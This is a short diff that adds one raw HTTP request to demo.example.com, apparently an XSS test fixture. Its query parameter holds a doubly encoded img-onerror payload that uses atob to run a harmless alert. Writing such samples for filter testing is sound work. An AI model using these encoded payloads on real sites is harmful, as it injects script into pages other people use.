@@ -1,0 +1,4 @@
+GET /a?path=%26%23x3C;img%20src%3D%26%23x22;x%26%23x22;%20onerror%3D%26%23x22;alert(atob(%26%23x27;YWxlcnQoMSk%3D%26%23x27;))%26%23x22;%26%23x3E; HTTP/1.1
+Host: demo.example.com
+Connection: close
+
